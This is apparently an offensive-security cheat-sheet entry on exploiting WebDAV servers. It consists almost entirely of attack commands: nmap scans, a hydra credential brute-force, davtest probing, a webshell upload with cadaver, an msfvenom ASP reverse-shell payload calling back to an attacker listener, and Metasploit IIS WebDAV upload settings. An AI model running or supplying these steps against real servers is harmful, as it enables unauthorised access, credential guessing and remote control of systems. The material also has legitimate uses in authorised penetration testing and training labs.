---
title: WebDAV Exploitation
category: initial-access
subcategory: web-attacks
os: linux
command: cadaver http://target/webdav
tools: nmap, hydra, davtest, cadaver, msfvenom
---


### Discovery scan

```bash
nmap -sV -sC 10.10.4.12
nmap -sV -p 80 --script=http-enum 10.10.4.12
```

### Bruteforce credentials

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
```

### Test WebDAV methods

```bash
davtest -url http://10.10.4.12/webdav
davtest -url http://10.10.4.12/webdav -auth bob:password_12312
```

### Upload shell via cadaver

```bash
cadaver http://10.2.1.2/webdav
```

```
ls
put /usr/share/webshells/asp/webshell.asp
```

### Metasploit IIS/WebDAV ASP upload

```bash
msfvenom LHOST=10.10.2.252 LPORT=1234 -f asp > shell.asp
```

```
use exploits/windows/iis/iis_webdav_upload_asp
set HttpUsername bob
set HttpPassword passwurd
set PATH /webdav/metasploit.asp
```
